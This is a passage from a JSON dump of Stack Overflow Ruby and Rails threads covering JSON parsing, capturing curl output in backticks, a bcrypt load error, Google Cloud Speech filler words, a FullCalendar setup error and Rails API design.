JSON.parse(File.read('data.json'))\n    .group_by { |h| h['Year'] }\n    .map { |year, entries| [year, entries.size] }\n    .to_h\nend\n</code></pre>\n\n<p>The method will return a hash where the keys are the years and the values are the counts:</p>\n\n<pre><code>count_years # =&gt; {\"2014\"=&gt;1, \"2016\"=&gt;1, \"2017\"=&gt;2}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6446605, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hoqIY.jpg?s=128&g=1", "display_name": "chess_king", "link": "https://stackoverflow.com/users/6446605/chess-king"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 92, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1511833263, "creation_date": 1511831336, "question_id": 47522400, "link": "https://stackoverflow.com/questions/47522400/ruby-import-json-data", "title": "ruby import json data", "body": "<p>How can I use parsed data from the data.rb file in the main.rb file ? </p>\n\n<p>I'm trying to count the number of times the year \"2017\" occurs, and how many times \"2014\" occurs.</p>\n\n<p>I want to return both counts to the method count_years which is in main.rb. How is this properly done?</p>\n\n<p><strong>main.rb</strong></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>def count_years\r\nFile.open('data.rb'))[:phone_data]\r\n    if :phone_data.\"Year\" == 2017\r\n       year_2017.count #new variable year_2017\r\n    end\r\n    if :phone_data.\"Year\" == 2014\r\n       year_2014.count #new variable year_2014\r\n    end\r\nend</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p><strong>data.rb</strong></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let(:phone_data) {\r\n  JSON.parse('[\r\n{\r\n  \"Phone\": \"iPhone 6\",\r\n  \"Year\": \"2014\"\r\n},\r\n{\r\n  \"Phone\": \"iPhone 7\",\r\n  \"Year\": \"2016\"\r\n\r\n},\r\n{\r\n  \"Car\": \"iPhone 8\",\r\n  \"Year\": \"2017\"\r\n},\r\n{\r\n  \"Car\": \"Galaxy S8\",\r\n  \"Year\": \"2017\"\r\n}\r\n\r\n]')\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p><strong>main.rb</strong></p>\n"}, {"tags": ["ruby", "shell", "variables", "curl", "backticks"], "answers": [{"comments": [{"owner": {"reputation": 355, "user_id": 994685, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1b9e9422c50749412d4926399897fd00?s=128&d=identicon&r=PG", "display_name": "Scotty", "link": "https://stackoverflow.com/users/994685/scotty"}, "edited": false, "score": 0, "creation_date": 1511829636, "post_id": 47522125, "comment_id": 82000743, "body": "Thank you for the explanation. Based on the info you provided I tested <code>a = `curl localhost 2&gt;&amp;1` </code> which works as I expected without needing to read from file. Can you add this to your answer so I can accept it"}, {"owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "edited": false, "score": 0, "creation_date": 1511830249, "post_id": 47522125, "comment_id": 82000899, "body": "<code>curl -s localhost</code> will silence the progress meters and will nicely give you just the response body in the stdout. No need for redirection shenanigans. Also, <code>require &#39;open-uri&#39;; a = open(&#39;http:&#47;&#47;localhost&#39;) { |f| f.read }</code> is a pure-Ruby equivalent."}, {"owner": {"reputation": 355, "user_id": 994685, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1b9e9422c50749412d4926399897fd00?s=128&d=identicon&r=PG", "display_name": "Scotty", "link": "https://stackoverflow.com/users/994685/scotty"}, "reply_to_user": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "edited": false, "score": 0, "creation_date": 1511844508, "post_id": 47522125, "comment_id": 82004498, "body": "Hi @Amadan, I have tried <code>curl -s localhost</code>, and this does silence the progress meter, but does not redirect anything to stdout for me"}, {"owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "edited": false, "score": 0, "creation_date": 1511844909, "post_id": 47522125, "comment_id": 82004615, "body": "It doesn&#39;t redirect - it just prints the URL contents to stdout, as per normal curl behaviour. if you&#39;re not getting anything from <code>foo = `curl -s localhost` </code>, your localhost might not have anything to say :P"}, {"owner": {"reputation": 355, "user_id": 994685, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1b9e9422c50749412d4926399897fd00?s=128&d=identicon&r=PG", "display_name": "Scotty", "link": "https://stackoverflow.com/users/994685/scotty"}, "edited": false, "score": 0, "creation_date": 1511846149, "post_id": 47522125, "comment_id": 82004994, "body": "Fair enough, I am actually looking to get the response <code>curl: (52) Empty reply from server</code> which is getting repressed by <code>curl -s localhost</code>, so that solution doesn&#39;t work for my case. Sorry I didn&#39;t specify that in the original question."}], "tags": [], "owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "is_accepted": true, "score": 1, "last_activity_date": 1511829955, "last_edit_date": 1511829955, "creation_date": 1511829183, "answer_id": 47522125, "question_id": 47521876, "link": "https://stackoverflow.com/questions/47521876/curl-command-being-printed-instead-of-stored-in-ruby/47522125#47522125", "title": "Curl command being printed instead of stored in Ruby", "body": "<p>From <code>man curl</code>:</p>\n\n<blockquote>\n  <p>curl normally displays a progress meter during operations, this data\n  is displayed to the terminal by default... If  you  want  a  progress \n  meter for HTTP POST or PUT requests, you need to redirect the response\n  output to a file, using shell redirect (>), -o, --output or similar.</p>\n</blockquote>\n\n<p>What happens when using backticks is that it only gets the standard output (stdout) of the command.</p>\n\n<p>If you need the curl output, you could use the -o option, this creates a file containing the output, which you can then use as you need.</p>\n\n<pre><code>`curl localhost -o curl_localhost_output.txt`\nputs File.read('path-to-file/curl_localhost_output.txt')\n</code></pre>\n\n<p>Also exists \"a way\" to redirect the stderr to stdout, but isn't to stdout but to a file named 1, so you could use <code>curl localhost 2&gt;&amp;1</code> and store the curl output, without having to create and read a file.</p>\n"}], "owner": {"reputation": 355, "user_id": 994685, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1b9e9422c50749412d4926399897fd00?s=128&d=identicon&r=PG", "display_name": "Scotty", "link": "https://stackoverflow.com/users/994685/scotty"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 264, "favorite_count": 0, "accepted_answer_id": 47522125, "answer_count": 1, "score": 1, "last_activity_date": 1511829955, "creation_date": 1511827555, "last_edit_date": 1511828044, "question_id": 47521876, "link": "https://stackoverflow.com/questions/47521876/curl-command-being-printed-instead-of-stored-in-ruby", "title": "Curl command being printed instead of stored in Ruby", "body": "<p>When I run this simple ruby script:</p>\n\n<pre><code>a = `curl localhost`\nputs \"Result is: #{a}\"\n\n\n=&gt; % Total    % Received % Xferd  Average Speed   Time    Time     Time  CurrentDload  Upload   Total   Spent    Left  Speed\n=&gt; 0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--    0curl: (7) Failed to connect to localhost port 80: Connection refused\n=&gt; Result is:\n</code></pre>\n\n<p>See that the result is being printed when the command is ran, and the variable is empty. But if I run any other command in the same format it works as I expect:</p>\n\n<pre><code>a = `ls`\nputs \"Result is: #{a}\"\n\n=&gt; Result is: test.rb\n</code></pre>\n\n<p>How can I store the results of the first curl command into a variable?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "bcrypt", "bcrypt-ruby"], "answers": [{"comments": [{"owner": {"reputation": 3048, "user_id": 2374626, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/Z78U0.jpg?s=128&g=1", "display_name": "Satishakumar Awati", "link": "https://stackoverflow.com/users/2374626/satishakumar-awati"}, "edited": false, "score": 0, "creation_date": 1511861623, "post_id": 47524278, "comment_id": 82012493, "body": "Better write answer instead of referencing link, which avoids dead link problem."}, {"owner": {"reputation": 124, "user_id": 4196506, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e51bc38ae839e5ff2bd8f316e086346?s=128&d=identicon&r=PG&f=1", "display_name": "born2bmild", "link": "https://stackoverflow.com/users/4196506/born2bmild"}, "reply_to_user": {"reputation": 3048, "user_id": 2374626, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/Z78U0.jpg?s=128&g=1", "display_name": "Satishakumar Awati", "link": "https://stackoverflow.com/users/2374626/satishakumar-awati"}, "edited": false, "score": 1, "creation_date": 1511864137, "post_id": 47524278, "comment_id": 82014246, "body": "@Satishakumar Awati  -Noted"}, {"owner": {"reputation": 75, "user_id": 8352983, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/10708be5bea074bb7abe1ab7fd11fc9c?s=128&d=identicon&r=PG&f=1", "display_name": "BaracudaBill", "link": "https://stackoverflow.com/users/8352983/baracudabill"}, "edited": false, "score": 0, "creation_date": 1512009740, "post_id": 47524278, "comment_id": 82088048, "body": "So although I was able to access the Rails Console again, the error message persists when setting up a new project.  Attempted to run everything the same as suggested, but to no avail."}, {"owner": {"reputation": 75, "user_id": 8352983, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/10708be5bea074bb7abe1ab7fd11fc9c?s=128&d=identicon&r=PG&f=1", "display_name": "BaracudaBill", "link": "https://stackoverflow.com/users/8352983/baracudabill"}, "edited": false, "score": 0, "creation_date": 1512024008, "post_id": 47524278, "comment_id": 82092134, "body": "So after searching forums and trying numerous recommendations-  gem &#39;bcrypt&#39;, git: &#39;<a href=\"https://github.com/codahale/bcrypt-ruby.git\" rel=\"nofollow noreferrer\">github.com/codahale/bcrypt-ruby.git</a>&#39;, :require =&gt; &#39;bcrypt&#39;  - in gemfile is what finally worked"}], "tags": [], "owner": {"reputation": 124, "user_id": 4196506, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e51bc38ae839e5ff2bd8f316e086346?s=128&d=identicon&r=PG&f=1", "display_name": "born2bmild", "link": "https://stackoverflow.com/users/4196506/born2bmild"}, "is_accepted": false, "score": 2, "last_activity_date": 1511864073, "last_edit_date": 1511864073, "creation_date": 1511845062, "answer_id": 47524278, "question_id": 47521677, "link": "https://stackoverflow.com/questions/47521677/bcrypt-loaderror-with-rails/47524278#47524278", "title": "bcrypt LoadError with Rails", "body": "<p>There are more recent solutions you may want to explore, but when I had this problem several months ago with Rails 5.0, I used the accepted answer <a href=\"https://stackoverflow.com/questions/34469246/bcrypt-loading-error-in-windows-10\">from this stack overflow question</a> and it worked for me.</p>\n\n<p><strong>Update:</strong>\nAs suggested, I have added full answer in case link becomes dead.\nFirst- Uninstall bcrypt</p>\n\n<pre><code>gem uninstall bcrypt-ruby\n</code></pre>\n\n<p>Then reinstall</p>\n\n<pre><code>gem install bcrypt --platform=ruby\n</code></pre>\n\n<p>Then in your Gemfile:</p>\n\n<pre><code>gem 'bcrypt','~&gt;3.1.11' # Or current version\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 8352983, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/10708be5bea074bb7abe1ab7fd11fc9c?s=128&d=identicon&r=PG&f=1", "display_name": "BaracudaBill", "link": "https://stackoverflow.com/users/8352983/baracudabill"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 248, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1512024152, "creation_date": 1511826397, "last_edit_date": 1512024152, "question_id": 47521677, "link": "https://stackoverflow.com/questions/47521677/bcrypt-loaderror-with-rails", "title": "bcrypt LoadError with Rails", "body": "<p>I am having trouble finding a solution to this issue, and have tried many fixes others have ran into with no success.  I am working on the Ruby on Rails 5 Tutorial by Michael Hartl which requires using bcrypt to implement the <code>has_secure_password</code> feature.  When I run the test I get a long error message which starts with:</p>\n\n<pre><code>C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/bcrypt-3.1.11-x64-mingw32/lib/bcrypt.rb:16:in 'require': cannot load such file -- bcrypt_ext (LoadError)\n</code></pre>\n\n<p>I have attempted uninstalling and reinstalling bcrypt with adding <code>--platform=ruby</code> at the end and including various versions in the gemfile; <code>gem 'bcrypt', '~&gt; 3.1.7'</code>, <code>'bcrypt', '3.1.11', platforms: [:ruby, :x64_mingw]</code>, <code>'bcrypt', '~&gt; 3.1.7', platforms: [:ruby]</code> including various combinations of installing the gem file from the command line.  Leaving the gemfile hashed out while installing from the console, uninstalling and running the Bundle Install with just the gemfile link.</p>\n\n<p>This is the entire Error message I am receiving when trying to access the Rails Console:</p>\n\n<pre><code>C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/bcrypt-3.1.11-x64-mingw32/lib/bcrypt.rb:16:in 'require': cannot load such file -- bcrypt_ext (LoadError)\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/bcrypt-3.1.11-x64-mingw32/lib/bcrypt.rb:16:in `rescue in &lt;top (required)&gt;'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/bcrypt-3.1.11-x64-mingw32/lib/bcrypt.rb:12:in `&lt;top (required)&gt;'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler/runtime.rb:81:in `require'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler/runtime.rb:81:in `block (2 levels) in require'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler/runtime.rb:76:in `each'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler/runtime.rb:76:in `block in require'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler/runtime.rb:65:in `each'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler/runtime.rb:65:in `require'\n    from C:/Ruby23-x64/lib/ruby/site_ruby/2.3.0/bundler.rb:114:in `require'\n    from C:/Users/Bill/Documents/Sites/sample_app/config/application.rb:7:in `&lt;top (required)&gt;'\n    from C:/Ruby23x64/lib/ruby/gems/2.3.0/gems/railties-.1.4/lib/rails/command/actions.rb:15:in `require'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/railties-5.1.4/lib/rails/command/actions.rb:15:in `require_application_and_environment!'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/railties-5.1.4/lib/rails/commands/console/console_command.rb:96:in `perform'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/thor-0.20.0/lib/thor/command.rb:27:in`run'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/thor-0.20.0/lib/thor/invocation.rb:126:in `invoke_command'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/thor-0.20.0/lib/thor.rb:387:in `dispatch'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/railties-5.1.4/lib/rails/command/base.rb:63:in `perform'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/railties-5.1.4/lib/rails/command.rb:44:in `invoke'\n    from C:/Ruby23-x64/lib/ruby/gems/2.3.0/gems/railties-5.1.4/lib/rails/commands.rb:16:in `&lt;top (required)&gt;'\n    from bin/rails:4:in `require'\n    from bin/rails:4:in `&lt;main&gt;'\n</code></pre>\n\n<p>I am using Ruby version 2.3.3 with Rails version 5.1.4 running on Windows 7x64.</p>\n\n<p>Any insight anyone could offer me at this point would be appreciated.</p>\n\n<p>UPDATE</p>\n\n<p>So after countless hours trying to solve the problem, using the gemfile:</p>\n\n<pre><code>gem 'bcrypt', git: 'https://github.com/codahale/bcrypt-ruby.git', :require =&gt; 'bcrypt'\n</code></pre>\n\n<p>was what solved the problem for me.  This may not be a permanent solution, but at least it's letting me move forward!</p>\n"}, {"tags": ["ruby", "google-cloud-speech"], "answers": [{"comments": [{"owner": {"reputation": 87, "user_id": 10840020, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5ljzQ.png?s=128&g=1", "display_name": "Sumit Jangra", "link": "https://stackoverflow.com/users/10840020/sumit-jangra"}, "edited": false, "score": 0, "creation_date": 1594366478, "post_id": 52309574, "comment_id": 111106120, "body": "Can you tell some good approch to detect filler sounds as mentioned in the questions?"}], "tags": [], "owner": {"reputation": 418, "user_id": 7430988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b59a823ea64c8aadabc1b9b0912e776?s=128&d=identicon&r=PG&f=1", "display_name": "Abhishek", "link": "https://stackoverflow.com/users/7430988/abhishek"}, "is_accepted": false, "score": 0, "last_activity_date": 1536827168, "creation_date": 1536827168, "answer_id": 52309574, "question_id": 47521398, "link": "https://stackoverflow.com/questions/47521398/how-to-highlight-filler-words-um-uh-ah-in-transcript/52309574#52309574", "title": "How to highlight filler words (Um, uh, ah) in transcript?", "body": "<p>Almost all the Speech recognition APIs are not able to detect the filler sounds like Ahs,Ums, Uhs etc.In order to detect those sounds the algorithm has to be trained to detect those particular sounds.</p>\n"}], "owner": {"reputation": 61, "user_id": 9017285, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bbe25f32f4cfd2ccf6f4b7d20f73cef1?s=128&d=identicon&r=PG&f=1", "display_name": "jerryhdev", "link": "https://stackoverflow.com/users/9017285/jerryhdev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 695, "favorite_count": 0, "answer_count": 1, "score": 5, "last_activity_date": 1536827168, "creation_date": 1511824641, "last_edit_date": 1511994989, "question_id": 47521398, "link": "https://stackoverflow.com/questions/47521398/how-to-highlight-filler-words-um-uh-ah-in-transcript", "title": "How to highlight filler words (Um, uh, ah) in transcript?", "body": "<p>Is there a configuration in google cloud speech that allows me to see the filler words in the returned JSON transcript? Currently, it seems like the transcript returned by google cloud speech automatically filters out such words (uh, um, ah, like, etc..).</p>\n\n<p>I've attempted to use the 'phrases' parameter in my audio recognize call, which puts emphasis on detecting specific phrases in the audio.</p>\n\n<pre><code>wordsToDetect = [\"um\", \"like\", \"so\", \"honestly\", \"basically\", \"actually\", \"uh\"]\n\naudio = speech.audio output_filepath,\n                     encoding: :flac,\n                     language: \"en-US\"\n\nresults = audio.recognize phrases: wordsToDetect\n</code></pre>\n\n<p>Is it the case that Google Cloud Speech simply automatically filters out filler words like \"um\" and \"uhhh\"?</p>\n"}, {"tags": ["javascript", "jquery", "ruby-on-rails", "ruby", "calendar"], "comments": [{"owner": {"reputation": 26120, "user_id": 219883, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c35b5b0f9e7cce48864f4f1545ead995?s=128&d=identicon&r=PG", "display_name": "Taryn East", "link": "https://stackoverflow.com/users/219883/taryn-east"}, "edited": false, "score": 0, "creation_date": 1511823364, "post_id": 47521033, "comment_id": 81998945, "body": "is this the gem: <a href=\"https://github.com/bokmann/fullcalendar-rails\" rel=\"nofollow noreferrer\">github.com/bokmann/fullcalendar-rails</a> if so, install seems similar but not exactly the same - try it with the above and see. (just use the simplest example from above link to see if it works, rather than the long bit of js you&#39;ve got above). Secondly: have you tried <code>spring restart</code> ? it&#39;s voodoo, but sometimes it Just Works."}, {"owner": {"reputation": 31, "user_id": 8954896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5aa9800834c3996f2cd1e8116d864ca6?s=128&d=identicon&r=PG", "display_name": "Diego", "link": "https://stackoverflow.com/users/8954896/diego"}, "reply_to_user": {"reputation": 26120, "user_id": 219883, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c35b5b0f9e7cce48864f4f1545ead995?s=128&d=identicon&r=PG", "display_name": "Taryn East", "link": "https://stackoverflow.com/users/219883/taryn-east"}, "edited": false, "score": 0, "creation_date": 1511951107, "post_id": 47521033, "comment_id": 82057427, "body": "But I don&#39;t use spring in this project, I am newbie and I don&#39;t remember use it in this project. Is this gen load by default?"}, {"owner": {"reputation": 26120, "user_id": 219883, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c35b5b0f9e7cce48864f4f1545ead995?s=128&d=identicon&r=PG", "display_name": "Taryn East", "link": "https://stackoverflow.com/users/219883/taryn-east"}, "edited": false, "score": 0, "creation_date": 1512081484, "post_id": 47521033, "comment_id": 82125173, "body": "Just try it... if it works, then that was your problem ;) (this is why it&#39;s voodoo) :D"}, {"owner": {"reputation": 31, "user_id": 8954896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5aa9800834c3996f2cd1e8116d864ca6?s=128&d=identicon&r=PG", "display_name": "Diego", "link": "https://stackoverflow.com/users/8954896/diego"}, "reply_to_user": {"reputation": 26120, "user_id": 219883, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c35b5b0f9e7cce48864f4f1545ead995?s=128&d=identicon&r=PG", "display_name": "Taryn East", "link": "https://stackoverflow.com/users/219883/taryn-east"}, "edited": false, "score": 0, "creation_date": 1512176008, "post_id": 47521033, "comment_id": 82165727, "body": "You are really scaring me :(  I put it but the terminal show this error: <code>dmuino@Diegos-MBP:~&#47;Desktop&#47;API$ spring restart WARN: Unresolved specs during Gem::Specification.reset:       minitest (~&gt; 5.1) WARN: Clearing out unresolved specs. Please report a bug if this causes problems. Version: 2.0.2  Usage: spring COMMAND [ARGS]  Commands for spring itself:    binstub         Generate spring based binstubs. Use --all to generate a binstub for all known commands. Use --remove to revert.   help            Print available commands.   server...</code>"}, {"owner": {"reputation": 26120, "user_id": 219883, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c35b5b0f9e7cce48864f4f1545ead995?s=128&d=identicon&r=PG", "display_name": "Taryn East", "link": "https://stackoverflow.com/users/219883/taryn-east"}, "edited": false, "score": 0, "creation_date": 1512341352, "post_id": 47521033, "comment_id": 82206185, "body": "Those look like warnings rather than errors..."}], "owner": {"reputation": 31, "user_id": 8954896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5aa9800834c3996f2cd1e8116d864ca6?s=128&d=identicon&r=PG", "display_name": "Diego", "link": "https://stackoverflow.com/users/8954896/diego"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 539, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511823207, "creation_date": 1511822418, "last_edit_date": 1511823207, "question_id": 47521033, "link": "https://stackoverflow.com/questions/47521033/full-calendar-uncaught-typeerror-fullcalendar-is-not-a-function-in-ru", "title": "Full calendar &quot; Uncaught TypeError: $(...).fullCalendar is not a function&quot; in Ruby on Rails", "body": "<p>I'm trying to add a calendar to my web app but it's not working. I followed the instructions below and I can't get the calendar to populate.</p>\n\n<p>Do I need to write all the Javascript as well? This seems like a quick step to install a calendar. I'm sure I'm missing some steps for installation but this is what I found online.</p>\n\n<p>Add to gemfile\u2028</p>\n\n<pre><code>gem 'fullcalendar-rails'\ngem 'momentjs-rails'\n</code></pre>\n\n<p>\u20282. Bundle install and restart rails server.</p>\n\n<p>\u20283. Add to application.js\u2028</p>\n\n<pre><code>//= require moment\n//= require fullcalendar\n</code></pre>\n\n<ol start=\"4\">\n<li><p>Add to host.html.erb and use script code</p>\n\n<pre><code>  &lt;script&gt;\n\n    window.reservations = &lt;%= raw @events.to_json %&gt;\n    window.days = &lt;%= raw @days.to_json %&gt;\n\n    function showReservations(data) {\n      return data.map(function (e) {\n        if (e['start_date'] !== e['end_date']) {\n          e['end_date'] = moment.utc(e['end_date']).add(1, 'days')\n        }\n\n        return {\n          name: e.fullname,\n          start: e['start_date'],\n          end: e['end_date'],\n          avatar: e.image,\n          status: e.status\n        }\n    });\n  };\n\n  $('#calendar').fullCalendar({\n    header: {\n      left: 'title',\n      center: '',\n      right: 'prev,next'\n    },\n    defaultDate: $('#start-date').val(),\n    events: showReservations(reservations),\n    eventRender: function(event, element, view) {\n      return $(`\n        &lt;a class=\"fc-day-grid-event fc-h-event fc-event fc-start fc-end\"&gt;\n          &lt;div class=\"fc-content ${event.status}\"&gt;\n            &lt;span class=\"fc-title\"&gt;&lt;img class=\"img-circle avatar-small\" src=\"${event.avatar}\"&gt; ${event.name}&lt;/span&gt;\n          &lt;/div&gt;\n        &lt;/a&gt;\n      `);\n    },\n    dayRender: function(date, cell) {\n      var dayInfo = $.grep(days, function(e) {\n        return e.day === date.format();\n      });\n\n      console.log(dayInfo);\n\n      &lt;% if !@rooms.blank? %&gt;\n        if (dayInfo.length &gt; 0) {\n          if (dayInfo[0].status == \"Not_Available\") {\n            cell.addClass('fc-past');\n          } else {\n            cell.append('&lt;span class=\"day-price\"&gt;' + '$' + dayInfo[0].price + '&lt;/span&gt;')\n          }\n        } else {\n          cell.append('&lt;span class=\"day-price\"&gt;' + '$&lt;%= @room.price %&gt;' + '&lt;/span&gt;')\n        }\n      &lt;% end %&gt;\n\n\n    },\n    selectable: true,\n    select: function(start, end, jsEvent, view) {\n      var start_date = moment(start);\n      var end_date = moment(end).subtract(1, \"days\");\n\n      &lt;% if @rooms.blank? %&gt;\n          $('#calendar').fullCalendar('unselect');\n      &lt;% end %&gt;\n\n      var overlap = reservations.filter(function(e) {\n        var r_start_date = moment(e.start_date);\n        var r_end_date = moment(e.end_date).subtract(1, \"days\");\n\n        return (r_start_date.isSameOrBefore(end_date) &amp;&amp; r_end_date.isSameOrAfter(start_date))\n      }).length &gt; 0;\n\n      if(start.isBefore(moment()) || overlap) {\n        $('#calendar').fullCalendar('unselect')\n      } else {\n        $('#new_calendar').modal('show');\n\n        $('#calendar_start_date').datepicker({\n          dateFormat: \"yy-mm-dd\",\n          setDate: start_date\n        });\n        $('#calendar_start_date').val(start_date.format(\"YYYY-MM-DD\"));\n\n        $('#calendar_end_date').datepicker({\n          dateFormat: \"yy-mm-dd\",\n          setDate: end_date\n        });\n        $('#calendar_end_date').val(end_date.format(\"YYYY-MM-DD\"));\n      }\n  },\n}\n  $('.fc-prev-button').click(function() {\n    var current = new Date($('#start-date').val());\n    var prev = new Date(current.getFullYear(), current.getMonth() - 1, 1)\n    $('#start-date').val(moment(prev).format('YYYY-MM-DD'))\n    $('#start-date').trigger('change')\n  });\n\n  $('.fc-next-button').click(function() {\n    var current = new Date($('#start-date').val());\n    var next = new Date(current.getFullYear(), current.getMonth() + 1, 1)\n    $('#start-date').val(moment(next).format('YYYY-MM-DD'))\n    $('#start-date').trigger('change')\n  });\n\n\n &lt;/script&gt;\n</code></pre></li>\n</ol>\n\n<p>The error in the console is \nUncaught TypeError: $(...).fullCalendar is not a function</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "nginx"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511823373, "post_id": 47520570, "comment_id": 81998947, "body": "It depends if you&#39;re using Rails + conventional HTML and JavaScript or Rails + JSON API + a front-end framework like React or Angular."}, {"owner": {"reputation": 907, "user_id": 3829628, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/c19940738ba88a1ddd90a02a544142ab?s=128&d=identicon&r=PG", "display_name": "A.Dumas", "link": "https://stackoverflow.com/users/3829628/a-dumas"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511866395, "post_id": 47520570, "comment_id": 82015901, "body": "So if I choose the latter option Rails + JSON API + a front-end with vue.js. What would be the ruby way."}], "answers": [{"comments": [{"owner": {"reputation": 907, "user_id": 3829628, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/c19940738ba88a1ddd90a02a544142ab?s=128&d=identicon&r=PG", "display_name": "A.Dumas", "link": "https://stackoverflow.com/users/3829628/a-dumas"}, "edited": false, "score": 0, "creation_date": 1511866314, "post_id": 47521668, "comment_id": 82015846, "body": "Thanks for the answer. To clarify  as Rails API is integrated into Rails can I just build a backend with a RESTful API? and how does Ajax play a role in this architecture I thought that if Rails is my backend it handles all the connection to a database and just hands data over to the front end via REST and Json object."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1511895422, "post_id": 47521668, "comment_id": 82034807, "body": "REST or GraphQL are both common options here for data-exchange from your client-side application to Rails. Using the API helper is not strictly necessary but may make your implementation easier, so it&#39;s worth at least trying it to see if it helps."}, {"owner": 